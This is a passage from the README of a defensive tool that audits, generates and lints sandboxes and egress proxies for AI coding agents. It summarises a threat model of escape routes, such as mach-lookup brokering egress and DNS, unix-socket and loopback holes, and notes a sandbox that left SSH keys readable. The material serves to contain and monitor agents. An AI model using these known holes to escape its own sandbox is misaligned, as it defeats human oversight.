sandboxcheckr run --rule registry.npmjs.org:GET,HEAD --allow registry.npmjs.org claude
sandboxcheckr run --canary-kill claude   # stop on a high-confidence trip
sandboxcheckr run --no-canary --no-agent-auth claude  # explicit opt-outs

# emit a ready-to-run wrapper (runner script + profile) scoped to a project
sandboxcheckr --emit seatbelt-strict    --workdir /path/to/project   # macOS, no network
sandboxcheckr --emit seatbelt-proxy     --workdir /path/to/project   # macOS, allow-listed egress
sandboxcheckr --emit seatbelt-network   --workdir /path/to/project   # macOS, unrestricted egress
sandboxcheckr --emit bubblewrap-strict  --workdir /path/to/project   # Linux, no network
sandboxcheckr --emit bubblewrap-proxy   --workdir /path/to/project   # Linux, allow-listed egress
sandboxcheckr --emit bubblewrap-network --workdir /path/to/project   # Linux, unrestricted egress
sandboxcheckr --emit seatbelt-proxy --proxy-port 9000 --workdir .   # use a different loopback port

sandboxcheckr proxy --observe      # discover what a program contacts, before enforcing
sandboxcheckr proxy --allow api.example.com --allow-port 443        # enforce
sandboxcheckr proxy --allow registry.corp --allow-private-host registry.corp \
    --rule registry.corp:GET,HEAD --ca-bundle-out ca.pem             # download-only, TLS-inspected
sandboxcheckr help proxy           # every proxy flag (--log, --events, --agent, --unix, --ready-file, --quiet, …)

sandboxcheckr console              # query the event log: agents, canaries, relays, shared, denied, tail
sandboxcheckr console agents       # one command, then exit (scriptable)
sandboxcheckr console canaries     # canary trips across agents

sandboxcheckr lint <profile.sb>    # statically audit any Seatbelt profile (exit 1 on a high finding):
                                   # allow-default, open reads, open egress, DNS / unix-socket /
                                   # every-loopback-port holes in a network deny, blanket mach-lookup
```

The default report also **discovers and lints agent sandboxes already on the
host** (gemini-cli, Codex, and similar) — an `AGENT SANDBOXES ON THIS HOST` section
shows each profile's egress posture (`open` / `proxied` / `denied`) and whether
it leaves reads open, using the same linter as `lint`. That's how you find out
whether the sandbox already wrapping your agents is enforcing egress or merely
restricting writes.

The report adapts to its environment: colour and the banner appear only on an
interactive terminal and are stripped when piped, so nothing writes escape codes
into a file or CI log. It honours `NO_COLOR` / `FORCE_COLOR`, detects terminal
width, and falls back to ASCII on dumb terminals. Exit code is `2` when nothing
could be recommended **or** the run was itself confined, so an indeterminate
result never reads as a pass in CI.

## Status

| Platform | Baseline + posture | Sandbox mechanisms | Verified on real hardware |
|---|---|---|---|
| macOS | ✓ (incl. TCC) | Seatbelt strict / proxied / practical | macOS 26.6 (probe results); runner scripts dry-run only — please report issues |
| Linux | ✓ | bubblewrap strict / proxied / practical | **Not yet.** Unit-tested; CI runs an end-to-end job on Ubuntu. Treat results as unverified until that job is green. |
| Windows | ✓ (BitLocker, Secure Boot, VBS/HVCI, Defender, Controlled Folder Access, Smart App Control, UAC, Windows Sandbox, WSL) | **None yet** — the report says so | Compiles; CI runs the unit tests |

**Not yet built:** an AppContainer / Windows Sandbox mechanism, a seccomp filter
for bubblewrap, a `mach-lookup` allow-list for Seatbelt (see SBX-009 in the
threat model), SARIF output, VM-class mechanisms (podman / Apple `container`),
and a Landlock-enforcing mechanism.

## Further reading

- [`THREAT_MODEL.md`](THREAT_MODEL.md): how the generated containment fails (below)
- [`SECURITY_ASSESSMENT_PLAN.md`](SECURITY_ASSESSMENT_PLAN.md): bypass hypotheses, safe probes, evidence and fix gates for agents and swarms
- [`OBSERVING_AGENTS.md`](OBSERVING_AGENTS.md): watching one agent or a swarm with the proxy and console
- [`ROADMAP.md`](../ROADMAP.md): shipped canaries and proposed later detectors and decoy relays

## Threat model

[`THREAT_MODEL.md`](THREAT_MODEL.md) is the adversarial analysis of the
containment this tool *generates* — the escape hypotheses, which held up under
testing and which didn't, and the open weaknesses. It's deliberately honest about
its own mistakes: the initial headline finding (that an unrestricted `mach-lookup`
brokers egress past `(deny network*)`) was **refuted** by testing on macOS 26.6,
and the document records that rather than quietly deleting it. Read it before
trusting any single verdict.

## Building

Pure Go, no cgo, no third-party dependencies.

```sh
make build     # host binary into ./bin
make test
make cross     # cross-compile check: linux, darwin, windows
```

`CGO_ENABLED=0` is required for cross-compiling from macOS.

## Licence

PolyForm Noncommercial 1.0.0 — see [LICENSE.txt](../LICENSE.txt). This license grants
noncommercial use; it does not grant commercial use. The source is public, but
the project is distributed as public source under a noncommercial license.
Security issues: see
[SECURITY.md](../SECURITY.md).

## A note on the sandbox this was written in

During development the tool reported the *development shell itself* as confined,
and found that sandbox permitted reading `~/.ssh/id_ed25519` and permitted DNS
while blocking writes to `$HOME`. That is the tool working as intended: a sandbox
that looks strong can still leave your signing keys readable, and you only learn
that by measuring.
